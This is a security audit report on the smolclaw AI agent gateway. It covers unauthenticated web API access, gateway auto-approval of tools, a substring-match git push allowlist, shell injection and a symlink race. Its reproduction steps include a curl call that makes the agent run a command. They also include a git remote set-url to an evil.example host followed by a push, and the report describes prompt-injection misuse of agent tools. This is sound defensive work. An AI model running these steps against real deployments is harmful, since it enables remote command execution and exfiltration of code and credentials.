# Security Audit Report — smolclaw

**Audit ID:** repo-audit-4298ba13  
**Date:** 2026-06-21  
**Scope:** Full repository (prioritized: `src/`, `scripts/`, `cmake/`, `config/`, `docs/operations/`; excluded deep reads: `build*/`, `deps/`, `.git`)  
**Method:** Static analysis tracing untrusted input from channels/API → agent → tools → sinks (exec, filesystem, network, MCP, git).

## Executive Summary

smolclaw implements substantial defense-in-depth (deny patterns, Landlock/seccomp sandbox, SSRF pinning on `web_fetch`, symlink checks on filesystem tools, pairing on chat channels, vault encryption). The strongest residual risks are **misconfiguration blast radius** and **a few implementation gaps** where higher-level controls can be bypassed.

Most critical issue: the **web channel treats a missing bearer token as “open access”**, and in gateway mode **all dangerous tools auto-approve**. If the web listener is reachable beyond loopback (common when operators bind `0.0.0.0`), an unauthenticated remote caller gets full agent capabilities including shell exec.

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 2 |
| Medium | 4 |
| Low | 2 |
| Informational | 2 |

---

## Untrusted Input Paths (Data-Flow Map)

| Source | Entry point | Validation | Sinks |
|--------|-------------|------------|-------|
| Web HTTP API | `src/channels/web.c` — `/api/message`, `/api/memory/*`, `/api/audit`, `/api/media` | Optional bearer token (`check_auth`); `run_repo_dir` segment check (`gateway_route.h`) | Agent bus → tool registry → exec/filesystem/git/web_fetch/MCP |
| Telegram/Discord/Slack/IRC/X | `src/channels/*.c` → `sc_channel_handle_message` | `allow_from`, pairing (`pairing.c`), rate limit (`rate_limit.c`) | Same agent/tool pipeline |
| CLI channel | `src/channels/cli.c` | Local stdin only | Same |
| LLM tool args | `src/tools/registry.c` → per-tool `execute` | JSON schema, 256KB cap, allowlist, deny patterns, confirm callback | `shell.c`, `filesystem.c`, `git.c`, `web.c`, `mcp/bridge.c`, etc. |
| MCP server responses | `src/mcp/client.c` → `mcp/bridge.c` | Tool name sanitization; child env/FD cleanup; sandbox | Returned to LLM as tool output |
| Config file | `src/config.c` | JSON parse; optional `.sha256` integrity check | Drives tokens, MCP commands, bind addresses, allowlists |
| Provider HTTP | `src/providers/http.c`, `src/providers/claude.c` | TLS via libcurl; API keys from vault/config | External LLM APIs |

**Notable bypass:** Web channel publishes directly to `sc_bus_publish_inbound` and **does not** pass through `sc_channel_handle_message`, so DM pairing / `allow_from` / per-channel rate limits do not apply to HTTP clients.

---

## Findings

### Web API is fully unauthenticated when bearer token is unset
- Severity: **critical**
- Location: `src/channels/web.c:307-310`, `src/channels/web.c:744-747`, `src/channels/web.c:1227-1228`
- Description: `check_auth()` returns success when `bearer_token` is NULL or empty (`return 1; /* No token configured = open */`). All sensitive endpoints (`/api/message`, `/api/memory/log`, `/api/memory/search`, `/api/audit`, `/api/media`, `/api/progress`) rely on this check.
- Impact: Any network client that can reach the bind address can drive the full AI agent: run shell commands (via LLM tool loop), read/write workspace files, append memory, read audit logs, and exfiltrate workspace images. Combined with gateway auto-confirm (see below), no human approval is required.
- Reproduction: needs env: gateway running with `channels.web.enabled=true`, `channels.web.bearer_token` unset or empty, bind address reachable (default warns on non-loopback at `web.c:1245-1248`).
  ```bash
  curl -s -X POST http://<host>:<port>/api/message \
    -H 'Content-Type: application/json' \
    -d '{"message":"Run: id"}'
  ```
- Remediation: **Fail closed** — refuse to start web channel without a bearer token, or require token for all mutating/ sensitive routes. Consider generating a random token at first boot. Keep loopback-only as explicit opt-in with loud fatal error for `0.0.0.0` without auth.
- Status: open

### Gateway mode auto-approves all tools that require confirmation
- Severity: **high**
- Location: `src/main.c:1872-1877`, `src/main.c:699-702`
- Description: `gateway_auto_confirm()` unconditionally returns `1`. Tools flagged `needs_confirm` (exec, git push, write_file, etc.) execute without operator approval in gateway/headless mode.
- Impact: Correctness relies entirely on deny patterns, exec allowlist, filesystem blocklists, and git push allowlist. Any bypass in those layers (or prompt-injection-driven misuse) executes immediately. This amplifies every other finding.
- Reproduction: Start `smolclaw gateway`; send a channel message instructing the agent to run a non-blocked command — no `[CONFIRM]` prompt appears.
- Remediation: Configurable confirm policy per deployment (`auto` / `deny` / webhook approval). At minimum, document that gateway mode is **unattended privileged execution** and must be network-isolated.
- Status: open

### Git push allowlist uses substring matching (bypass via crafted remote URL)
- Severity: **high**
- Location: `src/tools/git.c:342-349`
- Description: `is_push_remote_allowed()` uses `strstr(url, gd->push_allowed_remotes[i])` — substring match, not anchored host/URL equality.
- Impact: If operator configures e.g. `github.com/myorg`, a malicious remote URL like `https://attacker.com/?x=github.com/myorg` or `git@attacker.com:github.com/myorg/evil.git` may match. Attacker (via prompt injection) can run `git remote set-url origin <crafted-url>` (`remote` subcommand allowed, `needs_confirm=0` at subcommand level, auto-approved in gateway) then `git push` using ambient user credentials.
- Reproduction: needs env: `git.push_allowed_remotes` configured with a short substring; agent workspace is a git repo; gateway mode.
  1. `git` tool: `subcommand=remote`, `args=set-url origin https://evil.example/github.com/myorg/backdoor.git`
  2. `git` tool: `subcommand=push`, `args=origin main`
- Remediation: Parse remote URL host/path; use exact or prefix match on normalized URL (scheme + host + path). Block `remote set-url` / `remote add` or require confirmation. Re-validate URL at push time using parsed components, not `strstr`.
- Status: open

### `worktree` tool executes shell via `popen`/`system` outside exec guard
- Severity: **medium**
- Location: `src/tools/worktree.c:48-52`, `src/tools/worktree.c:135-137`
- Description: `git_exec()` builds `cd '<cwd>' && git <args>` and runs it through `/bin/sh -c` via `popen()`. `system(mkdir_cmd)` is also used. This bypasses `sc_exec_guard_command`, deny patterns, Landlock/seccomp sandbox, and safe env sanitization used by `shell.c`.
- Impact: Commands run with full user privileges. If workspace path contains shell metacharacters (e.g. single quote in directory name), command injection is possible. Even without injection, git subcommand arguments are passed through a shell (unnecessary attack surface).
- Reproduction: needs env: workspace path containing `'` (e.g. `/tmp/evil'/project`) and worktree tool enabled; call `worktree_enter`.
- Remediation: Refactor to `fork` + `execvp("git", ...)` like `src/tools/git.c`. Use `mkdir()` syscall instead of `system()`.
- Status: open

### Shell `working_dir` validated then used unresolved (symlink TOCTOU)
- Severity: **medium**
- Location: `src/tools/shell.c:191-202`, `src/tools/exec_common.c:278-279`
- Description: `shell_execute` validates `working_dir` with `sc_validate_path()` (uses `realpath`) but the child calls `chdir(working_dir)` with the **original** user-supplied string, not the resolved path.
- Impact: Time-of-check/time-of-use race: if `working_dir` is a symlink inside the workspace pointing outside, validation may follow the symlink at check time while a concurrent swap could alter behavior before `chdir`. Child process then executes commands outside the intended directory, weakening workspace restriction for exec output and relative-path operations.
- Reproduction: needs env: `restrict_to_workspace` enabled; race window narrow — requires concurrent filesystem mutation or cooperative timing.
- Remediation: Pass the resolved path from `sc_validate_path` into `sc_exec_child` for `chdir`. Consider `O_NOFOLLOW` directory open pattern.
- Status: open

### Web channel skips rate limiting and DM access controls
- Severity: **medium**
- Location: `src/channels/web.c:851-861` (direct bus publish) vs `src/channels/base.c:175-192` (rate limit in `sc_channel_handle_message`)
- Description: Web inbound messages bypass `sc_channel_handle_message`, so `allow_from`, pairing, and `sc_rate_limiter_check` never run for HTTP API traffic.
- Impact: When bearer token is set but leaked, or on open deployments, attackers can flood `/api/message` causing LLM cost exhaustion, CPU/memory pressure (`WEB_MAX_PENDING=100`), and audit log growth. No per-sender throttling exists for web.
- Reproduction: Rapid POST loop to `/api/message` with valid/empty auth.
- Remediation: Apply rate limiting in `handle_message` (per IP and/or per bearer token). Optionally integrate with global `rate_limit.c` config.
- Status: open

### `/api/health` exposes process information without authentication
- Severity: **low**
- Location: `src/channels/web.c:905-931`, `src/channels/web.c:1291`
- Description: `handle_health` does not call `check_auth()`. Returns version string, uptime, and pending request count to any caller.
- Impact: Reconnaissance for attackers probing exposed instances; aids targeted exploitation (version fingerprinting, load timing).
- Reproduction: `curl http://<host>:<port>/api/health`
- Remediation: Require auth, or bind health endpoint to loopback only / separate admin port.
- Status: open

### Chat UI served without authentication
- Severity: **low**
- Location: `src/channels/web.c:1120-1129`, `src/channels/web.c:1292`
- Description: `GET /` serves embedded chat HTML without auth. UI prompts for bearer token client-side (`sessionStorage`), but HTML/JS is public.
- Impact: Minor information disclosure (UI structure). Increases visibility of an exposed agent endpoint.
- Remediation: Serve UI only after auth, or disable UI in production gateway profiles.
- Status: open

### `restrict_message_tool` defaults off — cross-channel messaging possible
- Severity: **informational**
- Location: `src/tools/message.c:80-87`, `src/config.c:884-885`
- Description: Message tool accepts optional `channel` and `chat_id` override unless `restrict_message_tool` is enabled.
- Impact: Prompt-injected or manipulated agent could send outbound messages to arbitrary configured channels (Telegram, Slack, etc.) if those channels are enabled.
- Reproduction: Agent instructed to `message` tool with `channel=telegram`, `chat_id=<victim>`.
- Remediation: Default `restrict_message_tool` to `true` in gateway deployments; document explicitly.
- Status: open

### `web_search` uses redirect-following fetch without per-hop SSRF checks
- Severity: **informational**
- Location: `src/tools/web.c:186-207`, `src/tools/web.c:733`, `src/tools/web.c:756`, `src/tools/web.c:777`
- Description: `http_get()` follows redirects with `CURLOPT_FOLLOWLOCATION` and no SSRF re-validation (comment acknowledges this). Used for Brave/SearXNG/DuckDuckGo search backends.
- Impact: Low for typical deployments (base URLs are operator-configured). If `searxng_base_url` or `brave_base_url` points to an attacker-influenced redirector, internal network access could occur. Not reachable via `web_fetch` user URL path (that uses `http_get_no_follow` + per-hop `check_ssrf`).
- Remediation: Use manual redirect loop with SSRF checks for all outbound tools, or restrict search backends to pinned HTTPS URLs.
- Status: open

---

## Areas Reviewed — No Exploitable Issue Found

- **`web_fetch` SSRF:** `check_ssrf()` resolves DNS, blocks private ranges, pins via `CURLOPT_RESOLVE`, manual redirect loop re-checks (`src/tools/web.c:941-1125`). Test bypass is internal-only (`sc_web_set_ssrf_bypass`).
- **Filesystem tools:** Symlink rejection + `O_NOFOLLOW` + sensitive path blocklist (`src/tools/filesystem.c`).
- **Exec deny patterns:** Normalization (newline/unicode stripping), multi-segment allowlist, ~90 shared patterns (`src/tools/deny_patterns.h`, `src/tools/exec_common.c`).
- **MCP child hardening:** Dangerous env vars stripped, FD cleanup, Landlock sandbox (`src/mcp/client.c`).
- **Pairing:** Timing-safe code compare, lockout after 5 failures (`src/pairing.c`).
- **Web media path:** `web_confine_image` uses `realpath` + workspace prefix check (`src/channels/web.c:565-591`).
- **`run_repo_dir`:** Segment-aware `..` rejection (`src/gateway_route.h:44-56`).
- **Vault:** PBKDF2 600k iterations, AES-256-GCM (`src/util/vault.c` per `docs/SECURITY.md`).
- **Bearer compare:** Timing-safe (`sc_timing_safe_cmp` at `src/channels/web.c:318`).

---

## Recommendations (Priority Order)

1. **Fail closed on web auth** — refuse unauthenticated gateway web exposure.
2. **Harden git push allowlist** — parse URLs; block unconfirmed `remote` mutations.
3. **Remove shell from worktree** — align with `git.c` exec model.
4. **Add web rate limits** — per-IP and per-token.
5. **Resolve `working_dir` before chdir** in exec child.
6. **Document gateway threat model** — unattended auto-confirm is equivalent to giving shell to anyone who can talk to the agent.

---

## Severity Totals

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 2 |
| Medium | 4 |
| Low | 2 |
| Informational | 2 |
| **Total** | **11** |